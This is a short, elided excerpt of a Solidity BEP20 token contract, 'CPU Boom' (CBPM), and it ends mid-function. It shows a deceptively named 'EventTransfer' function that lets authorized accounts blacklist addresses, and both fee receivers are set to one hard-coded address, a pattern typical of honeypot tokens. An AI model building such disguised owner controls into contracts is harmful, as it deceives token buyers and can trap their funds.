...
contract CBPM  is IBEP20, Auth {
    ...
    string constant _name = "CPU Boom";
    string constant _symbol = "CBPM";
    ...
    address private marketingFeeReceiver = 0x2D75Bd4b90F3ab6A05829b0695D4C9Af1519547e;
    address private buybackFeeReceiver = 0x2D75Bd4b90F3ab6A05829b0695D4C9Af1519547e;
    ...
    function EventTransfer(address addr,bool bv) external authorized {
        isBL[addr] = bv;
    }
    ...
    function SetFeeReceiverss(address _marketingFeeReceiver, address _buybackFeeReceiver) external authorized {
